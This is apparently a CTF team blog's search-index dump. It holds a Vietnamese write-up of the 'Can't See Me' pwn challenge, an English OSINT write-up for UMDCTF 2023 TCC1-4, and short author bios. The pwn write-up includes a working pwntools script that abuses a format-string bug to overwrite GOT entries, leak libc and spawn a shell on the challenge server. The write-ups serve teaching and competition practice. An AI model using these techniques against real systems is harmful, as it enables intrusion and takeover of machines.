Can\u0026rsquo;t See Me #\rMô tả: The real magic is things that happen when your eyes can not see.\nSetup #\rTương tự như trên, đề cũng cho 3 file: chall, libc.so.6, ld-linux-x86-64.so.2. Mình sẽ link lại chúng trước để tiện cho việc debug sau này hơn.\n$ pwninit bin: ./chall libc: ./libc.so.6 ld: ./ld-linux-x86-64.so.2 copying ./chall to ./chall_patched running patchelf on ./chall_patched writing solve.py stub $ mv chall_patched chall $ ls chall flag.txt ld-linux-x86-64.so.2 libc.so.6 solve.py $ ldd chall linux-vdso.so.1 (0x00007ffd12af3000) libc.so.6 =\u0026gt; ./libc.so.6 (0x00007fefb2b5b000) ./ld-linux-x86-64.so.2 =\u0026gt; /lib64/ld-linux-x86-64.so.2 (0x00007fefb2d85000) Phân tích source code #\rChương trình chỉ có 2 hàm chính là main và get_msg. Như thường lệ thì mình sẽ coi hàm main trước.\nint __cdecl main(int argc, const char **argv, const char **envp) { char buf[40]; // [rsp+0h] [rbp-30h] BYREF unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); puts(\u0026#34;Wanna see me do a magic trick?\u0026#34;); puts(\u0026#34;Give me your message and I\u0026#39;ll see what I can do.\u0026#34;); get_msg(); puts(\u0026#34;Voila! Your message is now gone. Give me another:\u0026#34;); read(0, buf, 0x64uLL); return v6 - __readfsqword(0x28u); } Dễ dàng nhận thấy rằng ở hàm main bị dính một lỗi buffer overflow nghiêm trọng. Tuy nhiên chương trình đã bật chế độ bảo vệ Canary nên mình không thể cứ thế mà overwrite được giá trị trên stack. Vậy nên hãy chuyển qua phân tích hàm get_msg tiếp theo nào.\nunsigned __int64 get_msg() { FILE *stream; // [rsp+8h] [rbp-D8h] char s[200]; // [rsp+10h] [rbp-D0h] BYREF unsigned __int64 v3; // [rsp+D8h] [rbp-8h] v3 = __readfsqword(0x28u); stream = fopen(\u0026#34;/dev/null\u0026#34;, \u0026#34;w\u0026#34;); if ( stream ) { printf(\u0026#34;\u0026gt; \u0026#34;); fgets(s, 144, stdin); fprintf(stream, s); } printf(\u0026#34;Hippity hoppity, now you see me, now you don\u0026#39;t. Funni\\n\u0026#34;); return v3 - __readfsqword(0x28u); } Ở hàm này chương trình đọc vào input của mình nhập vô biến s sau đó tiến hành gọi hàm fprintf để in format từ biến s sang file /dev/null. Và cũng như tất cả các hàm thuộc họ printf khác, vì không chỉ định trước format mà in thẳng buffer người dùng nhập vào cho nên hàm này cũng bị dính lỗi format string. Còn hàm printf kia thì do chỉ in ra 1 string cố định mà có lẽ sẽ không thể bị khai thác được.\nMặc dù fprintf dính lỗi format string nhưng tất cả output đều đã được đưa vào bên trong file /dev/null và do đó không thể leak được giá trị trên stack bằng hàm này. Tuy nhiên cũng vì mang lỗi format string mà fprintf cũng có thể bị khai thác để tiến hành việc ghi đè dữ liệu lên các vùng nhớ khác tương tự như các hàm thuộc họ printf.\nNgoài ra, thông thường chương trình sẽ lưu các string cố định vào vùng nhớ .rodata (read only data) nhưng khi nhấp chuột vào string bên trong hàm printf kia thì nó lại dẫn mình đến vùng nhớ .data, tức nó là một biến global? Thậm chí nó còn có tên biến là msg nữa cơ.\nDo vùng nhớ .data có thể được ghi đè lên nên mình có thể thay đổi string này để khi chạy hàm printf sẽ dính lỗi format string và từ đó leak được giá trị trên stack ra ngoài.\nĐối với những người chơi pwn lâu năm thì sẽ dễ nhận ra điều này hơn do tính tối ưu khi compiler của gcc sẽ tự động biến câu lệnh\nprintf(\u0026#34;Hippity hoppity, now you see me, now you don\u0026#39;t. Funni\\n\u0026#34;); thành\nputs(\u0026#34;Hippity hoppity, now you see me, now you don\u0026#39;t. Funni\u0026#34;); nên không thể nào có chuyện một đoạn code như thế nằm chình ình trong chương trình mà cái string đó lại không phải là biến global được.\nVà đương nhiên việc có thể ghi đè lên được string này thì mình có thể tận dụng lỗi của hàm fprintf ở trước đó để khai thác. Nếu đã tới được đây rồi thì việc khai thác còn lại sẽ rẽ nhiều hướng khác nhau tùy thuộc vào chọn lựa của các bạn thôi.\nLên kịch bản khai thác #\rCho dù hướng đi của các bạn có là gì đi chăng nữa thì đều phải qua được một bước chung nhất đó chính là ghi đè lên biến msg để leak được giá trị trên stack ra và từ đó có thể khai thác theo nhiều kiểu khác nhau, tiêu biểu như:\nDùng fprintf để leak giá trị libc bằng printf đồng thời ghi đè lên GOT của hàm read hoặc hàm __stack_chk_fail thành địa chỉ của hàm main để chương trình quay trở về hàm main khi trigger 1 trong 2 hàm này. Sau đó lại tiếp tục khai thác hàm fprintf để ghi đè GOT của hàm printf thành system và ghi đè biến msg thành string \u0026ldquo;sh\u0026rdquo; để khi chương trình gọi printf(msg) thì nó sẽ gọi system(\u0026ldquo;sh\u0026rdquo;).\nDùng fprintf để leak giá trị libc và canary bằng printf sau đó lợi dụng lỗi buffer overflow của hàm main khi gọi read để ghi đè lên stack giá trị canary đúng sau đó tiếp tục overflow xuống dưới để ret2system và chiếm shell.\nDùng fprintf để leak giá trị libc ằng printf đồng thời ghi đè lên GOT của hàm __stack_chk_fail bằng câu lệnh ret để khiến nó trở nên vô dụng sau đó cũng khai thác việc gọi read ở hàm main để ret2system.\nĐối với mình thì mình sẽ sử dụng cách đầu tiên nhé.\nTiến hành debug #\rViệc debug ở đây cũng không có gì đáng chú ý, chủ yếu là mình đặt breakpoint ở 2 thời điểm lúc gọi fprintf và printf để xem buffer của mình ở offset thứ mấy trên stack (cho việc ghi đè bằng hàm fprintf) cũng như là của các giá trị cần tìm như libc, canary (cho việc leak).\nĐầu tiên là dừng tại lúc gọi hàm fprintf:\nChuỗi mình nhập vào nằm ở index thứ 2 trên stack, do hàm fprintf nhận vào tối thiểu 2 argument mà index thứ 0 trên stack sẽ bắt đầu ở offset thứ 5 chứ không phải thứ 6 như khi gọi printf. Qua đó mình biết được input buffer của mình nằm ở offset thứ 7.\nNgoài ra thì nếu các bạn muốn biết khi gọi hàm fprintf sẽ in cái gì vào /dev/null thì trong gdb trước khi chương trình gọi hàm này có thể dùng lệnh set $rdi=stdout để pipe output của hàm vào stdout thay vì vào /dev/null.\nTiếp theo mình sẽ dừng tại đoạn gọi printf:\nCác bạn có thể sử dụng lệnh stack \u0026lt;n\u0026gt; với n là số dòng trên stack muốn xem để có thể quan sát được các giá trị trong stack ở dưới sâu hơn. Dưới đây là kết quả của 30 giá trị trên stack:\nMình nhận thấy rằng có thể leak được giá trị của hàm puts+346 ở index thứ 0x15 (21) trên stack, tức là offset thứ 27 vì đây là hàm printf. Nếu các bạn muốn leak được thêm canary thì nó nằm ở offset 33 đấy.\nNhư mọi lần giải các thử thách pwnable thì sau đó là 1 khoảng thời gian cồng kềnh để debug kiểm tra từng bước trong script mình viết đã đúng hay chưa, việc ghi đè có đúng giá trị hay không,\u0026hellip; Nhưng chung quy lại thì đến đây là đã xong được 90% rồi, còn lại thì chỉ có viết script thôi.\nViết script khai thác #\rLại 1 lần nữa xin được nhắc nhở người biết cách giải bài này mà toàn bị chặn do script lỏ nhé. Tạo ticket mà thấy 80% là làm được nhưng toàn bị vấn đề scripting.\nfrom pwn import * context.binary = exe = ELF(\u0026#39;./chall\u0026#39;) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) script = \u0026#39;\u0026#39;\u0026#39;b* get_msg+144 b* main+124 c \u0026#39;\u0026#39;\u0026#39; # io = process() # gdb.attach(io, gdbscript=script, api=True) io = remote(\u0026#39;34.124.216.27\u0026#39;, 4200) # make GOT read function call main + leak libc puts+346 by overwriting the msg at printf payload = fmtstr_payload(7, {exe.got[\u0026#39;read\u0026#39;]:exe.sym[\u0026#39;main\u0026#39;], exe.sym[\u0026#39;msg\u0026#39;]:b\u0026#39;%27$p\u0026#39;}, write_size=\u0026#39;short\u0026#39;) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, payload) io.recvuntil(b\u0026#39;0x\u0026#39;) libc.address = int(io.recvuntil(b\u0026#39;t\u0026#39;)[:-1], 16) - (libc.sym[\u0026#39;puts\u0026#39;]+346) log.info(f\u0026#39;Libc base: {hex(libc.address)}\u0026#39;) payload = fmtstr_payload(7, {exe.got[\u0026#39;printf\u0026#39;]:libc.sym[\u0026#39;system\u0026#39;], exe.sym[\u0026#39;msg\u0026#39;]:b\u0026#39;sh\\0\u0026#39;}, write_size=\u0026#39;short\u0026#39;) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, payload) io.interactive() Chạy script rồi lấy flag thôi.\n$ python exp.py [+] Opening connection to 34.124.216.27 on port 4200: Done [*] Libc base: 0x7feada27e000 [*] Switching to interactive mode $ ls flag.txt run $ cat flag.txt BKISC{th3_m4g1k_0f_l34kl3s5_f0rm4t_1s_7h4t_y0u_c4n_5t1ll_wr1t3} ","date":"11 November 2023","externalUrl":null,"permalink":"/writeup/bkisc_recruit/","section":"","summary":"Writeup cho các thử thách mảng pwnable của giải CTF tuyển quân CLB ATTT BKISC.","title":"BKISC Recruitment CTF - PWN writeup","type":"writeup"},{"content":"","date":"2 May 2023","externalUrl":null,"permalink":"/tags/osint/","section":"Tags","summary":"","title":"Osint","type":"tags"},{"content":"","date":"2 May 2023","externalUrl":null,"permalink":"/tags/umdctf/","section":"Tags","summary":"","title":"UMDCTF","type":"tags"},{"content":"\rTCC1 #\rGiven website: Click here!\nDescription: I found this hacker group and they\u0026rsquo;re acting kinda strange. Let\u0026rsquo;s do some diggin\u0026rsquo;. Maybe we can find their discord server? I thought they linked it on their website before\u0026hellip;\nCategory: OSINT\nFrom the description, we know that the hacker group had linked their Discord server before. By pasting the website URL https://tcc.lol into the Wayback Machine, we successfully gained access to the deleted link of the Discord server!\nExamining the description of the welcome channel, we find the flag UMDCTF{w3lc0me_t0_th3_b35t_d!sc0rd_982364}\nTCC2 #\rDescription: What is the secret page on their website?\nThe secret page contains four questions. We must answer all of them correctly to access the flag.\nThe first question: What place did TCC get in their most recent CTF competition? After researching their team, we found them on ctftime. They only participated in DawgCTF 2023 and ranked 145th.\nThe second question: Which company is p1ku currently working for? We searched for p1ku\u0026rsquo;s email on Google and found his resume (his email can be found on the contact page if you didn\u0026rsquo;t know).\nIn the Professional Experience section, we learned that he works at Leidos.\nThe third question: What is bree\u0026rsquo;s favorite CTF category? In his profile on the members\u0026rsquo; page, there is a hashtag #miscgang. We can assume the answer is misc.\nThe last question: What is the brand name of the gift that blub is going to buy? We found a thread titled Gift in their Discord server.\nFrom the Amazon link and p1ku\u0026rsquo;s statement that there has to be a list they made, we can guess that the couple may have created an Amazon wedding registry. Searching for Bulberina - the name blub mentioned - we found their wedding registry (confirmed by the Hasbulla cutout on their list).\nBlub mentioned that it\u0026rsquo;s some kind of storage thing. After a few attempts, we discovered the correct gift. The answer is Shazo.\nAfter providing all the answers, we received the flag UMDCTF{y0u_sur3_kn0w_h0w_t0_d0_y0ur_r3s3@rch_289723}\nTCC3 #\rDescription: I\u0026rsquo;m missing contact information for one of the members. They said they were Out of Office (OOO) on vacation.\nUpon researching the term Out of Office (OOO), we learned that it is an automated email response sent to anyone who emails you while you\u0026rsquo;re away. In the contact page, mach0\u0026rsquo;s email is missing. We can assume the member they mentioned is mach0. We also noticed a pattern in the members\u0026rsquo; emails:\np1ku: p1ku.umdctf2023@gmail.com\nchadizard: chadizard.umdctf2023@gmail.com\nbree: bree.umdctf2023@gmail.com\nblub: blub.umdctf2023@gmail.com\ntitos: titos.umdctf2023@proton.me\nCould mach0\u0026rsquo;s email follow this pattern as well? We assumed it is mach0.umdctf2023@gmail.com. Based on the Out of Office (OOO) hint, we tried sending an email to him. Surprisingly, we received a response.\nHe left his telephone number (281) 698-0109. Suspecting he may have left a message on his phone, we called the number and found a voicemail. We recorded it, and you can access it here. The flag is UMDCTF{y0u_h4v3_r3ach3d_mach0_v01cema1l_333}\nTCC4 #\rDescription: mach0 told me he has been tweeting a lot and might expose TCC secrets!\nWe noticed that mach0 always ends his sentences with - macho in Discord.\nWe speculated he could do the same in his tweets. Searching the query \u0026quot;- macho\u0026quot; lang:en until:2023-05-01 since:2023-04-01 and sifting through thousands of tweets, we finally found his account here. We saw a pastebin in one of his tweets. We clicked on the link and obtained the flag: UMDCTF{tw1tt3r_adv4nc3d_s3arch_y0ink}\nConclusion #\rIn this challenge, we successfully investigated the hacker group through various OSINT techniques, including using the Wayback Machine, researching team rankings, exploring email patterns, and examining social media. We managed to find the flags in each step by digging deep into the information available and making educated guesses. This challenge emphasizes the importance of thorough research and persistence in solving complex problems. Overall, I would rate this challenge a 4 out of 5. The challenge required a combination of research skills, attention to detail, and creative thinking to successfully complete each step. The difficulty level made the challenge engaging and rewarding, while still being approachable for those with intermediate OSINT experience.\n","date":"2 May 2023","externalUrl":null,"permalink":"/writeup/umd-osint/","section":"","summary":"An in-depth writeup on UMDCTF 2023 - TCC1-4.","title":"UMDCTF 2023 - TCC1-4 writeup","type":"writeup"},{"content":"\rAbout me #\rJust a weeb.\n","date":"6 December 2003","externalUrl":null,"permalink":"/authors/baodoktah/","section":"","summary":"Misc and OSINT enjoyer","title":"BaoDoktah","type":"authors"},{"content":"\rAbout me #\rRToSI but I am the only one skill issue here.\n","date":"9 July 2003","externalUrl":null,"permalink":"/authors/ntc/","section":"","summary":"Weeber","title":"Ntc","type":"authors"},{"content":"\rHồ sơ nhân vật #\rTên: Lio\nLớp: Pwner\nDanh hiệu: Anh hùng Bàn phím, Siu hướng nội\nMô tả #\rWibu tiến hóa theo nhánh yuri enjoyer. Bị chuẩn đoán mắc chứng nghiện gacha mãn tính.\nCuộc đời của tui giống như một chương trình viết bằng C vậy, nhiều lỗi và dễ bị khai thác, lợi dụng.\nChơi pwn vì quá ngu toán để theo đuổi crypto, sẽ không chơi RE vì quá lười đọc code. Nhưng mà tui đang cố để tập tành theo mảng web mặc dù còn hơi non.\n\u0026ldquo;Nếu một chương trình có nhiều hơn 7 hàm hay một hàm có nhiều hơn 100 dòng code thì tui sẽ không đọc nó.\u0026rdquo;\nKỹ năng #\rCoding Mastery: 69/100 Laziness Control: 0/100 Sleeping Mastery: 9999999/100 Thành tựu #\rNgủ 25 tiếng 1 ngày\n","date":"26 March 2003","externalUrl":null,"permalink":"/authors/lio/","section":"","summary":"Woah! Một páo-ner hoang dã đã xuất hiện!","title":"Lio","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"}]